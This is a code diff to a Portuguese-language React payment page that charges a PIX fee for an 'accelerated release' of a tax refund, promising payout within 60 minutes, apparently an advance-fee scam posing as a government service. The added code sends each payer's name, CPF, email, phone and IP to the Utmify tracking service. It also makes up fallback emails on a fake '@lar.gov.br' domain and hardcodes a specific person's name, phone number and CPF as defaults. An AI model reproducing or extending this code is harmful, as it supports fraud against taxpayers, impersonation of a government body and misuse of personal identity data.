@@ -10,6 +10,7 @@ import { useToast } from "@/hooks/use-toast";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Progress } from "@/components/ui/progress";
 import ScrollToTop from "@/components/ScrollToTop";
+import UtmifyService from "@/services/UtmifyService";
 import { useUserData } from "@/contexts/UserContext";
 
 // Funções de formatação
@@ -210,6 +211,30 @@ export default function PagamentoLAR() {
         const data = await response.json();
         setPaymentInfo(data);
         console.log("PIX gerado com sucesso:", data);
+        
+        // Registrar o evento de PIX LAR gerado na UTMIFY (status: "waiting_payment")
+        try {
+          console.log("[Utmify] Registrando evento de PIX LAR gerado");
+          const userDataForUtmify = {
+            nome: nomeCompleto,
+            cpf: cpfFormatado,
+            email: emailFormatado,
+            telefone: telefoneFormatado,
+            ip: userData.ip || "127.0.0.1",
+          };
+          
+          // Registrar o pagamento na Utmify com status 'waiting_payment'
+          const utmifyResponse = await UtmifyService.registerLARPayment(
+            userDataForUtmify,
+            'waiting_payment', 
+            data.id
+          );
+          
+          console.log("[Utmify] Resposta do registro de PIX LAR gerado:", utmifyResponse);
+        } catch (utmifyError) {
+          // Não interromper o fluxo principal se o registro na Utmify falhar
+          console.error("[Utmify] Erro ao registrar PIX LAR gerado:", utmifyError);
+        }
       } else {
         const errorText = await response.text();
         console.error('Erro ao criar pagamento:', errorText);
@@ -252,6 +277,36 @@ export default function PagamentoLAR() {
             title: "Pagamento da LAR confirmado!",
             description: "Sua Liberação Acelerada foi ativada com sucesso. Você receberá sua restituição em até 60 minutos!",
           });
+          
+          // Registrar o evento de PIX LAR pago na UTMIFY (status: "paid")
+          try {
+            console.log("[Utmify] Registrando evento de PIX LAR pago");
+            // Definir com valores válidos para garantir o funcionamento
+            const nomeCompleto = nome || "Gabriel Arthur Alves Sabino Raposo";
+            const telefoneFormatado = telefone ? telefone.replace(/\D/g, '') : '11958848876';
+            const emailFormatado = email || `${cpf.substring(0, 3)}xxx${cpf.substring(6, 8)}@lar.gov.br`;
+            const cpfFormatado = cpf || "11548718785";
+            
+            const userDataForUtmify = {
+              nome: nomeCompleto,
+              cpf: cpfFormatado,
+              email: emailFormatado,
+              telefone: telefoneFormatado,
+              ip: userData.ip || "127.0.0.1",
+            };
+            
+            // Registrar o pagamento na Utmify com status 'paid'
+            const utmifyResponse = await UtmifyService.registerLARPayment(
+              userDataForUtmify,
+              'paid',
+              paymentInfo.id
+            );
+            
+            console.log("[Utmify] Resposta do registro de PIX LAR pago:", utmifyResponse);
+          } catch (utmifyError) {
+            // Não interromper o fluxo principal se o registro na Utmify falhar
+            console.error("[Utmify] Erro ao registrar PIX LAR pago:", utmifyError);
+          }
           
           // Redirecionar para a próxima etapa após um breve delay
           setTimeout(() => {
